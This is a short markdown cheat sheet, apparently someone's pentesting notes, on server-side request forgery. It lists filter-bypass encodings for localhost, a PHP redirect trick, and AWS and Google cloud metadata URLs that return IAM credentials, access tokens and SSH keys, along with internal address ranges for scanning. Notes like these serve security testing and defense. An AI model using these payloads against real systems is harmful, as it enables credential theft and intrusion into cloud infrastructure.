# SSRF

## WHERE

### File Upload	(SVGs, JPGs, XMLs and JSONs)
	
#### SVGs : 

- Proxies
- Admin Configuration
- Webhooks
- URLs embedded in files that are processed by the application
- Hidden API endpoints that accept URLs as input
- HTML tag injections

## BYPASS

### Whitelist
	
* Open redirect
* @ , # , / , . 
* Encoding ?

### Blacklist
	
* Encoding
	
		. Hex : 127.0.0.1 translates to 0x7f.0x0.0x0.0x1
		. Octal : 127.0.0.1 translates to 0177.0.0.01
		. DWord : 127.0.0.1 translates to 2130706433
		. URL Encoding : localhost translates to %6c%6f%63%61%6c%68%6f%73%74
		. Mixed : 127.0.0.1 translates to 0177.0.0.0x1

* Ip V6
* DNS 
* Redirect : <?php header(“location: http://127.0.0.1"); ?> / TinyUrl 

## EXPLOIT

### Collect instance metadata 
	
#### AWS

	* http://169.254.169.254/latest/meta-data/ returns the list of available metadata that you can query.

	* http://169.254.169.254/latest/meta-data/local-hostname/ returns the internal hostname used by the host.

	* http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME returns the security credentials of that role.

	* http://169.254.169.254/latest/dynamic/instance-identity/document reveals the private IP address of the current instance.

	* http://169.254.169.254/latest/user-data/ returns user data on the current instance. 

#### GOOGLE

	* http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token returns the access token of the default account on the instance.

	* http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-key returns public SSH keys that can connect to other instances in this project.

### fingerprinting : 
	
* internally : port scanning, other services on internal ip ? 

		. Internal adress : https://en.wikipedia.org/wiki/Reserved_IP_addresses
		. 127.0.0.0/8
		. 192.168.0.0/16
		. 10.0.0.0/8

* externally : user agent in dns/http request

### Bypass access controls

### RCE ???

## LINKS

	- SSRF Bible : <https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM/edit#heading=h.kwcnj7jh5zyy>

	- Vickie Li : <https://medium.com/@vickieli/sitemap-xml-6ecc3b14b4f>

	- Internal adress : <https://en.wikipedia.org/wiki/Reserved_IP_addresses>

	- Common ports : <https://packetlife.net/media/library/23/common-ports.pdf>
	
	- AWS EC2 Docs: <http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html> (includes a comprehensive Instance Metadata Categories table)
	
	- Toutes les references possibles !!! : <https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4>
